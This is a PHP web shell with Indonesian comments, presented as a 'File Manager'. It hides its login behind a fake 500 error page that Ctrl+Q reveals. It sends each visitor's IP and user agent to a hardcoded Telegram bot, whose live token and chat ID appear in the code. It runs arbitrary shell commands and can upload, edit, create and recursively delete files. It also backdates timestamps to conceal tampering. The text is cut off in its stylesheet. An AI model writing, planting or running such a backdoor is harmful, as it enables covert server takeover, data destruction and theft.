<?php
// TAMPILKAN ERROR (opsional saat debug)
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

// === Konfigurasi Telegram ===
$telegram_token  = '8362974651:AAF24LdqgRXAlxRWwLqhiSMpmOz-ihGjEMg';
$telegram_chatid = '7949114896';

// === Fungsi kirim pesan ke Telegram ===
function send_telegram($message) {
    global $telegram_token, $telegram_chatid;

    $url = "https://api.telegram.org/bot$telegram_token/sendMessage";
    $data = [
        'chat_id' => $telegram_chatid,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// === Event login (ALFA) ===
$username = $_POST['username'] ?? '@INFOLOGIN';
$login_ok = rand(0, 1) === 1;

$ip   = $_SERVER['REMOTE_ADDR'] ?? '-';
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? '-';
$time = date("Y-m-d H:i:s");

$status_icon = $login_ok ? "✅" : "❌";
$status_text = $login_ok ? "LOGIN BERHASIL" : "LOGIN GAGAL";

$domain   = $_SERVER['HTTP_HOST'] ?? '-';
$page     = $_SERVER['REQUEST_URI'] ?? '-';
$full_url = "https://{$domain}{$page}";

$message = "<b>$status_icon $status_text</b>\n"
         . "👤 User: <code>$username</code>\n"
         . "🕒 Waktu: <code>$time</code>\n"
         . "🌐 IP: <code>$ip</code>\n"
         . "📱 UA: <code>$ua</code>\n"
         . "🧲 Halaman: <a href=\"$full_url\">$full_url</a>";

send_telegram($message);

// Opsional log lokal
// file_put_contents('/var/log/login_notif.log', strip_tags($message) . "\n", FILE_APPEND);


// ===== Proteksi akses =====
$param = ''; // tidak dipakai, tapi biar tidak null
$dir   = isset($_GET['directory']) ? (string)$_GET['directory'] : getcwd();


$correct_user = 'tabrak';        // samain dengan Alfa kalau mau
$correct_pass_md5 = 'd9cbeb7d3171b39e916cc4cb35c3b071';

if (empty($_COOKIE['AlfaPass']) || $_COOKIE['AlfaPass'] !== $correct_pass_md5) {

    if (!empty($_POST['username']) && !empty($_POST['password'])) {
        if (md5($_POST['password']) === $correct_pass_md5) {
            setcookie('AlfaUser', $correct_user, time()+86400, '/');
            setcookie('AlfaPass', $correct_pass_md5, time()+86400, '/');
            header('Location: '.$_SERVER['PHP_SELF']);
            exit;
        }
    }

    header('HTTP/1.1 500 Internal Server Error');
    $SERVER_SIG = $_SERVER['SERVER_SIGNATURE'] ?? '';

    echo $SERVER_SIG.'</body>
<style>
body {
    background: #fff;
    color: #000;
    margin: 0;
    padding: 0;
    font-family: sans-serif;
}
#loginbox {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #f9f9f9;
    padding: 25px 30px;
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(0,0,0,0.2);
    text-align: center;
}
input[type=text], input[type=password] {
    width: 220px;
    padding: 8px;
    margin: 8px 0;
    border: 1px solid #ccc;
    border-radius: 5px;
}
input[type=submit] {
    background: #333;
    color: #fff;
    border: none;
    padding: 8px 15px;
    border-radius: 5px;
    cursor: pointer;
}
h3 { margin-top: 0; }
</style>
<script>
document.addEventListener("keydown", function(e) {
  if (e.ctrlKey && e.key.toLowerCase() === "q") {
    e.preventDefault();
    const box = document.getElementById("loginbox");
    box.style.display = (box.style.display === "none" || box.style.display === "") ? "block" : "none";
  }
});
</script>
</html><body>
  <div id="loginbox">
    <form method="post">
      <h3>Login</h3>
      <input type="text" name="username" placeholder="Username"><br>
      <input type="password" name="password" placeholder="Password"><br>
      <input type="submit" value="Login">
    </form>
  </div>
</body>';
    exit;
}


// ===== Default root =====
$defaultRoot = $_SERVER['DOCUMENT_ROOT'] ?? __DIR__;

// ===== Ambil parameter =====
$terminalHistory = '';
$recursive = isset($_REQUEST['recursive']);
$filename         = trim($_REQUEST['filename'] ?? '');
$content          = $_REQUEST['content'] ?? '';
$deleteFile       = trim($_REQUEST['deletefile'] ?? '');

// directory RELATIF dari DOCUMENT_ROOT, default "/"
$relDir           = $_REQUEST['directory'] ?? '/';

$chmodFile        = trim($_REQUEST['chmodfile'] ?? '');
$chmodPerm        = $_REQUEST['chmodperm'] ?? '755';
$recursive        = isset($_REQUEST['recursive']);
$action           = $_REQUEST['action'] ?? '';
$cmd              = $_POST['cmd'] ?? '';
$newTimeRaw       = $_POST['newtime'] ?? '';
$targetTime       = $_POST['target'] ?? '';
$chmodFileAllPerm = $_REQUEST['chmod_file_all_perm'] ?? '644';
$chmodDirAllPerm  = $_REQUEST['chmod_dir_all_perm'] ?? '755';

// Normalisasi path utama (untuk operasi file)
$dir = realpath($defaultRoot . '/' . ltrim($relDir, '/')) ?: $defaultRoot;


// base target CHMOD (editable)
$chmodBaseRaw = $_REQUEST['chmod_base'] ?? $dir ?? $defaultRoot;
$chmodBase    = $chmodBaseRaw ?: $defaultRoot;

// path yang ditampilkan di label (DOCUMENT_ROOT)
$displayPath = $defaultRoot;

// ===== Fungsi DOWNLOAD =====
function processDownload($dir, $filename) {
    $filepath = rtrim($dir, '/\\') . '/' . $filename;
    if (file_exists($filepath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filepath));
        readfile($filepath);
        exit;
    } else {
        echo "<p style='color:red'>❌ File tidak ditemukan: $filepath</p>";
    }
}

// ===== Fungsi CHMOD single =====
function processInlineChmod($dir, $chmodFile, $chmodPerm, $recursive) {
    $chmodPerm = substr(preg_replace('/[^0-7]/', '', (string)$chmodPerm), -3);
    if ($chmodPerm === '') {
        echo "<p style='color:red'>❌ Format permission tidak valid</p>";
        return;
    }

    if (!is_dir($dir) || !is_writable($dir)) {
        echo "<p style='color:red'>❌ Tidak bisa akses folder: $dir</p>";
        return;
    }
    
    if (!empty($chmodFile)) {
        $fileToChmod = rtrim($dir, '/\\') . '/' . $chmodFile;
        if (file_exists($fileToChmod)) {
            if (chmod($fileToChmod, octdec($chmodPerm))) { // [web:31][web:26]
                echo "<p style='color:green'>✅ CHMOD $chmodPerm → $fileToChmod</p>";
            } else {
                echo "<p style='color:red'>❌ Gagal CHMOD $fileToChmod</p>";
            }
        } else {
            echo "<p style='color:gray'>ℹ️ File tidak ditemukan: $fileToChmod</p>";
        }
    }
    
    if ($recursive) {
        $folders = array_filter(glob($dir . '/*'), 'is_dir');
        foreach ($folders as $folder) {
            processInlineChmod($folder, $chmodFile, $chmodPerm, true);
        }
    }
}


// ===== Fungsi HAPUS (FILE/FOLDER RECURSIVE) =====
function processDelete($dir, $deleteFile, $recursive) {
    if (!is_dir($dir) || !is_writable($dir)) {
        echo "<p style='color:red'>❌ Tidak bisa akses folder: $dir</p>";
        return;
    }
    if (!empty($deleteFile)) {
        $itemToDelete = rtrim($dir, '/\\') . '/' . $deleteFile;
        if (file_exists($itemToDelete)) {
            if (is_dir($itemToDelete)) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($itemToDelete, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                foreach ($files as $file) {
                    if ($file->isDir()) {
                        rmdir($file->getRealPath());
                    } else {
                        unlink($file->getRealPath());
                    }
                }
                rmdir($itemToDelete);
                echo "<p style='color:blue'>🗑️ FOLDER dihapus: $itemToDelete</p>";
            } else {
                if (unlink($itemToDelete)) {
                    echo "<p style='color:blue'>🗑️ File dihapus: $itemToDelete</p>";
                } else {
                    echo "<p style='color:red'>❌ Gagal hapus: $itemToDelete</p>";
                }
            }
        } else {
            echo "<p style='color:gray'>ℹ️ Tidak ditemukan: $itemToDelete</p>";
        }
    }
    if ($recursive && !empty($deleteFile)) {
        $folders = array_filter(glob($dir . '/*'), 'is_dir');
        foreach ($folders as $folder) {
            processDelete($folder, $deleteFile, true);
        }
    }
}

// ===== Fungsi Terminal =====
function processTerminal($cmd) {
    if (empty($cmd)) return '';

    $cmd = trim($cmd);
    $dangerous = [';', '&', '|', '`', '>', '<', 'rm -rf', 'chmod 777', 'chown', 'dd if'];
    foreach ($dangerous as $bad) {
        if (stripos($cmd, $bad) !== false) {
            return "<div class='term-line'><span class='term-prompt'>$</span><span class='term-cmd'>" .
                   htmlspecialchars($cmd) .
                   "</span></div><div class='term-output error'>🚫 Dangerous command blocked: $bad</div>";
        }
    }

    // jalankan langsung, tetap escape output [web:371]
    $output = shell_exec($cmd . " 2>&1");

    $html  = "<div class='term-line'><span class='term-prompt'>$</span><span class='term-cmd'>" .
             htmlspecialchars($cmd) . "</span></div>";
    if ($output === null || $output === '') {
        $html .= "<div class='term-output'>⚠️ No output or command failed</div>";
    } else {
        $html .= "<div class='term-output'>" . htmlspecialchars($output) . "</div>";
    }
    return $html;
}



// ===== Fungsi lainnya (create, open, save) =====
function processCreate($dir, $filename, $content, $recursive) {
    if (!is_dir($dir) || !is_writable($dir)) {
        echo "<p style='color:red'>❌ Tidak bisa tulis di folder: $dir</p>";
        return;
    }
    if (!empty($filename)) {
        $filepath = rtrim($dir, '/\\') . '/' . $filename;
        if (!file_exists($filepath)) {
            if (file_put_contents($filepath, $content)) {
                echo "<p style='color:green'>✅ Dibuat: $filepath</p>";
            } else {
                echo "<p style='color:red'>❌ Gagal buat: $filepath</p>";
            }
        } else {
            echo "<p style='color:orange'>⚠️ Sudah ada: $filepath</p>";
        }
    }
}


function processOpen($dir, $filename) {
    $filepath = rtrim($dir, '/\\') . '/' . $filename;
    if (file_exists($filepath)) {
        echo "<h3>📂 Isi File: $filepath</h3>";
        echo "<form method='POST'>
                <input type='hidden' name='access' value='" . htmlspecialchars($_GET['access'] ?? '', ENT_QUOTES) . "'>
                <input type='hidden' name='directory' value='" . htmlspecialchars($dir, ENT_QUOTES) . "'>
                <input type='hidden' name='filename' value='" . htmlspecialchars($filename, ENT_QUOTES) . "'>
                <textarea name='content' rows='20' style='width:100%;font-family:monospace;'>"
                    . htmlspecialchars(file_get_contents($filepath)) .
                "</textarea>
                <br><button class='btn create' name='action' value='save'>💾 Save</button>
              </form>";
    } else {
        echo "<p style='color:gray'>ℹ️ File tidak ditemukan: $filepath</p>";
    }
}


function processSave($dir, $filename, $content) {
    $filepath = rtrim($dir, '/\\') . '/' . $filename;
    if (file_exists($filepath) && is_writable($filepath)) {
        if (file_put_contents($filepath, $content)) {
            echo "<p style='color:green'>💾 File disimpan: $filepath</p>";
        } else {
            echo "<p style='color:red'>❌ Gagal simpan file: $filepath</p>";
        }
    } else {
        echo "<p style='color:red'>❌ File tidak bisa diakses: $filepath</p>";
    }
}

// ===== LIST DIRECTORY - WITH TIME, CHMOD, DELETE BUTTONS =====
function listDirectory($dir, $accessHash) {
    global $defaultRoot;

    // path relatif current dir
    $relDir = str_replace($defaultRoot, '', $dir);
    if ($relDir === '') $relDir = '/';

    echo "<div class='card'><h3>📁 " . htmlspecialchars($relDir) . "</h3>";

    // parent link
    $parent = dirname($dir);
    if ($parent && $parent !== $dir) {
        $relParent = str_replace($defaultRoot, '', $parent);
        if ($relParent === '') $relParent = '/';
        $url = "?access=" . urlencode($accessHash) . "&directory=" . urlencode($relParent);
        echo "<p><a href='$url' style='color:#00ff41'>⬆️ Parent: "
           . htmlspecialchars($relParent) . "</a></p>";
    }

    $items = @scandir($dir) ?: [];
    echo "<div class='file-table'><table>
            <tr><th>Nama</th><th>Ukuran</th><th>Modifikasi</th><th>Permission</th><th>Aksi</th></tr>";

    // FOLDERS DULU
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $item;
        if (!is_dir($full)) continue;

        // path relatif folder ini
        $relChild = str_replace($defaultRoot, '', $full);
        if ($relChild === '') $relChild = '/';

        $safeItem = htmlspecialchars($item, ENT_QUOTES);
        $mtime    = @filemtime($full);
        $modTime  = $mtime ? @date('Y-m-d H:i:s', $mtime) : '-';
        $perms    = substr(sprintf('%o', @fileperms($full)), -4);

        // URL pakai relatif
        $url = "?access=" . urlencode($accessHash) . "&directory=" . urlencode($relChild);
        $deleteUrl = "?access=" . urlencode($accessHash)
                   . "&directory=" . urlencode($relDir)
                   . "&deletefile=" . urlencode($item) . "&action=delete";

        echo "<tr>
                <td>📁 <a href='$url' style='color:#00ff41'>$safeItem</a></td>
                <td>-</td>
                <td>
                    <form method='POST' style='margin:0;'>
                        <input type='hidden' name='access'
                               value='" . htmlspecialchars($accessHash, ENT_QUOTES) . "'>
                        <input type='hidden' name='directory'
                               value='" . htmlspecialchars($relDir, ENT_QUOTES) . "'>
                        <input type='hidden' name='target'
                               value='" . htmlspecialchars($item, ENT_QUOTES) . "'>
                        <input type='text' name='newtime'
                               value='$modTime'
                               placeholder='YYYY-mm-dd HH:ii:ss'
                               style='width:180px;height:24px;font-size:11px;background:#111;
                                      color:#0f0;border:1px solid #444;border-radius:4px;'>
                        <button type='submit' name='action' value='touchtime'
                                class='btn-mini' style='background:#555;margin-left:2px;'>WAKTU</button>
                    </form>
                </td>
                <td><span class='perms'>$perms</span></td>
                <td>
                    <form method='POST' style='display:inline-block;margin:0 4px;padding:0;'>
                        <input type='hidden' name='access'
                               value='" . htmlspecialchars($accessHash, ENT_QUOTES) . "'>
                        <input type='hidden' name='directory'
                               value='" . htmlspecialchars($relDir, ENT_QUOTES) . "'>
                        <input type='hidden' name='chmodfile'
                               value='" . htmlspecialchars($item, ENT_QUOTES) . "'>
                        <input type='text' name='chmodperm'
                               value='" . htmlspecialchars(substr($perms, -3), ENT_QUOTES) . "'
                               style='width:70px;height:24px;font-size:12px;text-align:center;
                                      margin-right:4px;border-radius:4px;border:1px solid #ffaa00;'
                               maxlength='4'>
                        <button type='submit' name='action' value='chmod'
                                class='btn-mini chmod' title='Apply CHMOD folder'>CHMOD</button>
                    </form>

                    <a href='$deleteUrl' class='btn-mini delete'
                       onclick=\"return confirm('Hapus folder $safeItem?');\">HAPUS</a>
                </td>
              </tr>";
    }


    // FILES SESUDAHNYA
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $item;
        if (!is_file($full)) continue;

        $safeItem = htmlspecialchars($item, ENT_QUOTES);
        $size     = @filesize($full);
        $mtime    = @filemtime($full);
        $modTime  = $mtime ? @date('Y-m-d H:i:s', $mtime) : '-';
        $perms    = substr(sprintf('%o', @fileperms($full)), -4);

        echo "<tr>
                <td>📄 $safeItem</td>
                <td>" . number_format($size) . " B</td>
                <td>$modTime</td>
                <td><span class='perms'>$perms</span></td>
                <td>
                    <form method='POST' style='display:inline-block;margin:0 4px;padding:0;'>
                        <input type='hidden' name='access'
                            value='" . htmlspecialchars($accessHash, ENT_QUOTES) . "'>
                        <input type='hidden' name='directory'
                            value='" . htmlspecialchars($relDir, ENT_QUOTES) . "'>
                        <input type='hidden' name='filename'
                            value='" . htmlspecialchars($item, ENT_QUOTES) . "'>

                        <button class='btn-mini open' name='action' value='open'>BUKA/EDIT</button>
                        <button class='btn-mini download' name='action' value='download'>HAPUS</button>
                        <button class='btn-mini delete' name='action' value='delete_file'
                                onclick=\"return confirm('Hapus file $safeItem?');\">HAPUS</button>
                    </form>
                </td>
            </tr>";
    }

    echo "</table></div></div>";
    }




// DEBUG CEK shell_exec
$test = @shell_exec('echo OK 2>&1');
if ($test === null) {
    // berarti shell_exec kemungkinan besar disable di php.ini [web:426]
}

// ===== Cek shell_exec & command =====
function shell_exec_enabled(): bool {
    return is_callable('shell_exec')
        && false === stripos((string)ini_get('disable_functions'), 'shell_exec'); // [web:426]
}

function cmd_exists(string $cmd): bool {
    if (!shell_exec_enabled()) return false;
    $tester = stripos(PHP_OS, 'WIN') === false ? 'command -v' : 'where';         // [web:422]
    $out = @shell_exec("$tester " . escapeshellarg($cmd) . " 2>&1");
    return !empty($out);
}

// siapkan status
$features = [
    'gcc'     => cmd_exists('gcc'),
    'wget'    => cmd_exists('wget'),
    'curl'    => cmd_exists('curl'),
    'python3' => cmd_exists('python3'),
    'php'     => cmd_exists('php'),
];

function touchtimeAllInDir($baseDir, $newTimeRaw) {
    $ts = strtotime($newTimeRaw); // parse "YYYY-MM-DD HH:MM:SS" [web:439]
    if ($ts === false) {
        echo "<p style='color:red'>❌ Format waktu salah! Gunakan: YYYY-MM-DD HH:MM:SS</p>";
        return;
    }

    if (!is_dir($baseDir) || !is_readable($baseDir)) {
        echo "<p style='color:red'>❌ Tidak bisa akses folder: $baseDir</p>";
        return;
    }

    $files = 0;
    $dirs  = 0;

    foreach (scandir($baseDir) ?: [] as $item) { // [web:454]
        if ($item === '.' || $item === '..') continue;
        $full = $baseDir . DIRECTORY_SEPARATOR . $item;

        if (is_file($full)) {
            if (@touch($full, $ts, $ts)) { // atime & mtime [web:430][web:449]
                $files++;
            }
        } elseif (is_dir($full)) {
            if (@touch($full, $ts, $ts)) {
                $dirs++;
            }
        }
    }

    echo "<p style='color:green'>
        ⏱️ Waktu diubah: $files file, $dirs folder di
        " . htmlspecialchars($baseDir, ENT_QUOTES) . "
        → " . date('Y-m-d H:i:s', $ts) . "
    </p>";
}


// Ubah waktu semua FILE + FOLDER di 1 path (rekursif, sama seperti script contoh)
function updateTimeRecursive($target, $time, &$log = []) {
    if (is_file($target) || is_dir($target)) {
        @touch($target, $time, $time);          // atime & mtime [web:430]
        $log[] = $target;
    }

    if (is_dir($target)) {
        $items = scandir($target);             // [web:427]
        foreach ($items ?: [] as $item) {
            if ($item === '.' || $item === '..') continue;
            $full = $target . DIRECTORY_SEPARATOR . $item;
            updateTimeRecursive($full, $time, $log);
        }
    }

    return $log;
}

// ===== Eksekusi =====
// ===== Eksekusi =====
if (!empty($action)) {

    if ($action === 'terminal') {

        // Jalankan perintah terminal (hasil TERAKHIR saja)
        if (!empty($cmd)) {
            $terminalHistory = processTerminal($cmd);  // hanya output terakhir [web:371]
        }

    } elseif ($action === 'upload_file') {

        if (empty($_FILES['upload_file']) || $_FILES['upload_file']['error'] !== UPLOAD_ERR_OK) {
            echo "<p style='color:red'>❌ Upload gagal / tidak ada file</p>";
        } else {
            $tmp  = $_FILES['upload_file']['tmp_name'];
            $name = basename($_FILES['upload_file']['name']);

            $targetDir = $dir;
            if (!is_dir($targetDir) || !is_writable($targetDir)) {
                echo "<p style='color:red'>❌ Folder tidak bisa ditulis: "
                     . htmlspecialchars($targetDir, ENT_QUOTES) . "</p>";
            } else {
                $dest = rtrim($targetDir, '/\\') . '/' . $name;

                if (move_uploaded_file($tmp, $dest)) {          // [web:578][web:581]
                    echo "<p style='color:green'>✅ Upload sukses: "
                         . htmlspecialchars($dest, ENT_QUOTES) . "</p>";
                } else {
                    echo "<p style='color:red'>❌ Gagal memindahkan file ke: "
                         . htmlspecialchars($dest, ENT_QUOTES) . "</p>";
                }
            }
        }

    } elseif ($action === 'download') {

        processDownload($dir, $filename);

    } elseif ($action === 'chmod') {

        // CHMOD single file/dir
        processInlineChmod($dir, $chmodFile, $chmodPerm, $recursive);

    } elseif ($action === 'chmod_files_all') {

        // CHMOD semua FILE di dalam $chmodBase (non-recursive)
        $base = $chmodBase;
        $perm = substr(preg_replace('/[^0-7]/', '', (string)$chmodFileAllPerm), -3);
        if ($perm === '') {
            echo "<p style='color:red'>❌ Permission FILE tidak valid</p>";
        } else {
            $permOct = octdec($perm);
            $count = 0;
            if (is_dir($base)) {
                foreach (scandir($base) ?: [] as $item) { // [web:454]
                    if ($item === '.' || $item === '..') continue;
                    $full = $base . DIRECTORY_SEPARATOR . $item;
                    if (is_file($full) && @chmod($full, $permOct)) {
                        $count++;
                    }
                }
                echo "<p style='color:green'>✅ CHMOD $perm ke $count file di $base</p>";
            } else {
                echo "<p style='color:red'>❌ Bukan folder: $base</p>";
            }
        }

    } elseif ($action === 'chmod_dirs_all') {

        // CHMOD semua FOLDER di dalam $chmodBase (non-recursive)
        $base = $chmodBase;
        $perm = substr(preg_replace('/[^0-7]/', '', (string)$chmodDirAllPerm), -3);
        if ($perm === '') {
            echo "<p style='color:red'>❌ Permission DIR tidak valid</p>";
        } else {
            $permOct = octdec($perm);
            $count = 0;
            if (is_dir($base)) {
                foreach (scandir($base) ?: [] as $item) { // [web:454]
                    if ($item === '.' || $item === '..') continue;
                    $full = $base . DIRECTORY_SEPARATOR . $item;
                    if (is_dir($full) && @chmod($full, $permOct)) {
                        $count++;
                    }
                }
                echo "<p style='color:green'>✅ CHMOD $perm ke $count folder di $base</p>";
            } else {
                echo "<p style='color:red'>❌ Bukan folder: $base</p>";
            }
        }

    } elseif ($action === 'time_all' && !empty($newTimeRaw)) {

        // Ubah waktu semua FILE & FOLDER di dalam $chmodBase (non-recursive)
        $ts = strtotime($newTimeRaw); // [web:445][web:439]
        if ($ts === false) {
            echo "<p style='color:red'>❌ Format waktu salah! Gunakan: YYYY-MM-DD HH:MM:SS</p>";
        } else {
            $base = $chmodBase;
            if (!is_dir($base) || !is_readable($base)) {
                echo "<p style='color:red'>❌ Tidak bisa akses folder: $base</p>";
            } else {
                $files = 0;
                $dirs  = 0;

                foreach (scandir($base) ?: [] as $item) { // [web:454]
                    if ($item === '.' || $item === '..') continue;
                    $full = $base . DIRECTORY_SEPARATOR . $item;

                    if (is_file($full)) {
                        if (@touch($full, $ts, $ts)) {      // atime & mtime [web:430][web:449]
                            $files++;
                        }
                    } elseif (is_dir($full)) {
                        if (@touch($full, $ts, $ts)) {
                            $dirs++;
                        }
                    }
                }

                echo "<p style='color:green'>
                    ⏱️ Waktu diubah: $files file, $dirs folder di
                    " . htmlspecialchars($base, ENT_QUOTES) . "
                    → " . date('Y-m-d H:i:s', $ts) . "
                </p>";
            }
        }

    } elseif ($action === 'delete_file') {

        // Hapus 1 file (input: deletefile)
        if (!empty($deleteFile)) {
            $path = rtrim($dir, '/\\') . '/' . $deleteFile;
            if (is_file($path) && @unlink($path)) {          // [web:338]
                echo "<p style='color:blue'>HAPUS File dihapus: $path</p>";
            } else {
                echo "<p style='color:red'>❌ Gagal hapus file: $path</p>";
            }
        }

    } elseif ($action === 'delete_file_all') {

        // Hapus file dengan nama tertentu di SEMUA folder (recursive)
        if (empty($deleteFile)) {
            echo "<p style='color:red'>❌ Nama file kosong</p>";
        } elseif (!is_dir($dir) || !is_readable($dir)) {
            echo "<p style='color:red'>❌ Tidak bisa akses folder: $dir</p>";
        } else {
            $count = 0;

            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );                                              // [web:428][web:440]

            foreach ($it as $path => $info) {
                if ($info->isFile() && $info->getFilename() === $deleteFile) {
                    if (@unlink($path)) {                   // [web:338]
                        $count++;
                        echo "<p style='color:blue'>🗑️ File dihapus: $path</p>";
                    } else {
                        echo "<p style='color:red'>❌ Gagal hapus: $path</p>";
                    }
                }
            }

            echo "<p style='color:blue'>HAPUS '$deleteFile' dihapus dari $count lokasi di $dir dan semua subfolder</p>";
        }

    } elseif ($action === 'create_file') {

        // Buat satu file di $dir (input: filename + content)
        if (!empty($filename)) {
            $path = rtrim($dir, '/\\') . '/' . $filename;
            if (!file_exists($path)) {
                if (file_put_contents($path, $content) !== false) {   // [web:467]
                    echo "<p style='color:green'>✅ File dibuat: $path</p>";
                } else {
                    echo "<p style='color:red'>❌ Gagal buat file: $path</p>";
                }
            } else {
                echo "<p style='color:orange'>⚠️ File sudah ada: $path</p>";
            }
        } else {
            echo "<p style='color:red'>❌ Filename kosong</p>";
        }

    } elseif ($action === 'create_file_all_dir') {

        // Buat file yang sama di semua subfolder (recursive)
        if (empty($filename)) {
            echo "<p style='color:red'>❌ Nama file kosong</p>";
        } elseif (!is_dir($dir) || !is_readable($dir)) {
            echo "<p style='color:red'>❌ Tidak bisa akses folder: $dir</p>";
        } else {
            $count = 0;
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );                                              // [web:428][web:440]

            foreach ($it as $path => $info) {
                if ($info->isDir()) {
                    $target = rtrim($path, '/\\') . '/' . $filename;
                    if (!file_exists($target)) {
                        if (@file_put_contents($target, $content) !== false) {
                            $count++;
                            echo "<p style='color:green'>✅ File dibuat: $target</p>";
                        } else {
                            echo "<p style='color:red'>❌ Gagal buat: $target</p>";
                        }
                    } else {
                        echo "<p style='color:orange'>⚠️ Sudah ada: $target</p>";
                    }
                }
            }

            echo "<p style='color:green'>📁 Selesai, file '$filename' dibuat di $count folder</p>";
        }

    } elseif ($action === 'open') {

        processOpen($dir, $filename);

    } elseif ($action === 'save') {

        processSave($dir, $filename, $content);

    } elseif ($action === 'touchtime' && !empty($newTimeRaw)) {

        // parse input waktu, contoh: 2022-12-10 00:00:00
        $newtime = strtotime($newTimeRaw);                      // [web:445]
        if ($newtime === false) {
            echo "<p style='color:red'>❌ Format waktu tidak valid</p>";
        } else {

            if (!empty($recursive)) {

                // MODE RECURSIVE: abaikan target, apply ke SEMUA file + folder
                $basePath = $dir;

                $log = [];
                updateTimeRecursive($basePath, $newtime, $log); // [web:430][web:427]

                echo "<p style='color:green'>
                    ✅ Waktu berhasil diubah untuk " . count($log) . " file/folder di
                    " . htmlspecialchars($basePath, ENT_QUOTES) . " (rekursif)
                </p>";

            } else {

                // MODE SINGLE: hanya 1 target di current dir
                if (!empty($targetTime)) {
                    $path = rtrim($dir, '/\\') . '/' . $targetTime;
                    if (file_exists($path) && @touch($path, $newtime, $newtime)) { // [web:430]
                        echo "<p style='color:green'>
                            ⏱️ Waktu berhasil diubah untuk: " . htmlspecialchars($path, ENT_QUOTES) . "
                        </p>";
                    } else {
                        echo "<p style='color:red'>❌ Gagal ubah waktu: "
                             . htmlspecialchars($path ?? '', ENT_QUOTES) . "</p>";
                    }
                } else {
                    echo "<p style='color:red'>❌ Target kosong</p>";
                }
            }
        }
    }
}




?>
<!DOCTYPE html>
<html>
<head>
    <title>🖥️ File Manager</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'SF Mono', 'Monaco', 'Inconsolata', monospace;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        h1, h2, h3 { color: #00ff41; text-shadow: 0 0 10px #00ff41; margin-bottom: 20px; }
        h1 { font-size: 2em; }

        /* Modern Cards */
        .card {
            background: rgba(20, 20, 20, 0.95);
            backdrop-filter: blur(10px);
            border: 1px solid #333;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
        }

        /* Inputs & Buttons */
        input[type="text"], input[type="number"], textarea, select {
            background: #1a1a1a;
            border: 2px solid #333;
            border-radius: 8px;
            padding: 12px 16px;
            color: #e0e0e0;
            font-family: inherit;
            font-size: 14px;
            transition: all 0.3s ease;
            width: 100%;
            margin-bottom: 10px;
        }
        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: #00ff41;
            box-shadow: 0 0 15px rgba(0,255,65,0.3);
        }
        label { 
            display: block; 
            color: #00ff41; 
            font-weight: 500; 
            margin: 15px 0 8px 0;
            font-size: 14px;
        }
        .btn {
            background: linear-gradient(45deg, #00ff41, #00cc33);
            color: #000;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-family: inherit;
            font-weight: 600;
            font-size: 14px;
            transition: all 0.3s ease;
            margin: 5px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,255,65,0.4); }
        .btn-mini {
            background: #4479ff;
            color: white;
            border: none;
            padding: 6px 10px;
            border-radius: 4px;
            font-size: 11px;
            text-decoration: none;
            display: inline-block;
            margin: 1px;
        }
        .btn-mini:hover { background: #3366cc; transform: scale(1.05); }
        .btn-mini.download { background: #ffaa00; }
        .btn-mini.download:hover { background: #cc8800; }
        .btn-mini.chmod { 
            background: #ffaa00; 
            font-size: 10px;
            padding: 6px 8px;
        }
        .btn-mini.chmod:hover { background: #cc8800; }
        .btn-mini.delete { 
            background: #ff4444; 
            font-size: 10px;
            padding: 6px 8px;
        }
        .btn-mini.delete:hover { background: #cc3333; }

        .create { background: linear-gradient(45deg, #00ff41, #00cc33); }
        .delete { background: linear-gradient(45deg, #ff4444, #cc3333); color: white !important; }
        .open   { background: linear-gradient(45deg, #4479ff, #3366cc); color: white !important; }
        .chmod  { background: linear-gradient(45deg, #ffaa00, #cc8800); color: white !important; }

        /* File Table */
        .file-table table {
            width: 100%;
            border-collapse: collapse;
            background: #1a1a1a;
            border-radius: 8px;
            overflow: hidden;
            margin-top: 15px;
        }
        .file-table th {
            background: linear-gradient(90deg, #00ff41, #00cc33);
            color: #000;
            padding: 12px 15px;
            font-weight: 600;
            text-transform: uppercase;
            font-size: 11px;
            letter-spacing: 1px;
        }
        .file-table td { 
            padding: 12px 15px; 
            border-bottom: 1px solid #333;
            font-size: 13px;
        }
        .file-table tr:hover { background: rgba(0,255,65,0.1); }
        .perms {
            background: #333;
            color: #ffaa00;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 11px;
        }

        /* TERMINAL */
        .terminal-container { position: relative; }
        .terminal-toggle {
            background: linear-gradient(45deg, #00ff41, #00cc33);
            color: #000;
            border: none;
